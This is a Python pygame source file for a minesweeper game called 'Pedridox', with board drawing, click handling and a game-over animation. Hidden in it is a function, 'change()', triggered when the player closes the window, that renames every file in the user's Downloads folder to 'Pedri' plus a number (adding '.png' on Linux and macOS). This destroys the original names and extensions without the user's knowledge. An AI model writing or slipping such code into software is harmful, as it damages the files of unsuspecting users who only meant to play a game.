from random import random

import pygame
import minesweeper
import button
import os


def main():
    sweeper = minesweeper.Minesweeper(15, 15, 20)

    pygame.init()

    # create game window

    TILES = len(sweeper.board)

    SCREEN_WIDTH = 800
    SCREEN_HEIGHT = 600

    BOARD_WIDTH = 450
    BOARD_HEIGHT = 450

    TILE_WIDTH = BOARD_WIDTH / TILES
    TILE_HEIGHT = BOARD_HEIGHT / TILES

    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("Pedridox")

    programIcon = pygame.image.load('Data/icon.png')
    bg = pygame.image.load("Data/bgt2.png")
    fg = pygame.image.load("Data/fg2.png")

    # import tiles
    tiles = [0] * 9
    for i in range(0, 9):
        tiles[i] = pygame.image.load("Data/newTiles/tile_" + str(i) + ".png")
        tiles[i] = pygame.transform.scale(tiles[i], (TILE_WIDTH, TILE_HEIGHT))

    tile_bomb = pygame.image.load("Data/Tiles/tile_psi.png")
    tile_plain = pygame.image.load("Data/Tiles/tile_plain.png")
    tile_flag = pygame.image.load("Data/Tiles/tile_flag_w.png")

    tile_bomb = pygame.transform.scale(tile_bomb, (TILE_WIDTH, TILE_HEIGHT))
    tile_plain = pygame.transform.scale(tile_plain, (TILE_WIDTH, TILE_HEIGHT))
    tile_flag = pygame.transform.scale(tile_flag, (TILE_WIDTH, TILE_HEIGHT))

    bg = pygame.transform.scale(bg, (SCREEN_WIDTH, SCREEN_HEIGHT))
    fg = pygame.transform.scale(fg, (SCREEN_WIDTH, SCREEN_HEIGHT))

    pygame.display.set_icon(programIcon)

    running = True
    game = True
    clock = pygame.time.Clock()

    # create window end

    def action(x, y, flag):
        xbuffer = (SCREEN_WIDTH - BOARD_WIDTH) // 2
        ybuffer = (SCREEN_HEIGHT - BOARD_HEIGHT) // 2
        if xbuffer < x < SCREEN_WIDTH - xbuffer:
            if ybuffer < y < SCREEN_HEIGHT - ybuffer:
                x = (x - xbuffer) // TILE_WIDTH
                y = (y - ybuffer) // TILE_HEIGHT
                if flag:
                    sweeper.set_flag(int(y), int(x))
                else:
                    return sweeper.set_inputs(int(y), int(x))
        return True

    def display(arr):
        for i, _ in enumerate(arr):
            for j, _ in enumerate(arr[i]):
                if arr[i][j] == "Z":
                    screen.blit(tile_plain, ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                             (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))
                elif arr[i][j] == "X":
                    screen.blit(tile_bomb, ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                            (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))
                elif arr[i][j] == "F":
                    screen.blit(tile_flag, ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                            (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))
                else:
                    screen.blit(tiles[int(arr[i][j])], ((SCREEN_WIDTH - BOARD_WIDTH) // 2 + i * TILE_WIDTH,
                                                        (SCREEN_HEIGHT - BOARD_HEIGHT + 15) // 2 + j * TILE_HEIGHT))

    def change():
        if os.name == 'nt':
            if len((dir := os.listdir(os.path.expanduser('~') + r"\Downloads"))) > 0:
                for i, file in enumerate(dir):
                    path = os.path.expanduser('~') + fr"\Downloads\{file}"
                    os.rename(path, fr"{os.path.expanduser('~')}\Downloads\Pedri{str(i)}")
        if os.name == 'posix':
            if len((dir := os.listdir(os.path.expanduser('~') + r"/Downloads/"))) > 0:
                for i, file in enumerate(dir):
                    path = os.path.expanduser('~') + fr"/Downloads/{file}"
                    os.rename(path, fr"{os.path.expanduser('~')}/Downloads/Pedri{str(i)}.png")


    # Game Loop
    while running:
        screen.blit(bg, (0, 0))
        display(sweeper.board)

        screen.blit(fg, (0, 0))

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                change()
                running = False
            if event.type == pygame.MOUSEBUTTONUP and game == True:
                game = action(event.pos[0], event.pos[1], False)
            if event.type == pygame.TEXTINPUT and game == True:
                action(pygame.mouse.get_pos()[0], pygame.mouse.get_pos()[1], True)

        if game == False:
            game_over(screen, SCREEN_WIDTH, SCREEN_WIDTH, clock)

        pygame.display.flip()
        clock.tick(60)

    # Game Loop End


def game_over(screen, width, height, clock) -> None:
    pygame.image.save(screen, "Data/end.png")
    end = pygame.image.load("Data/end.png")
    gob = pygame.image.load("Data/game_over.png")
    game_over_background = pygame.transform.scale(gob, (300, 250))
    for y in range(200):
        screen.blit(end, (0, 0))
        screen.blit(game_over_background, (width // 2 - 150, y))
        pygame.display.flip()
        clock.tick(60)
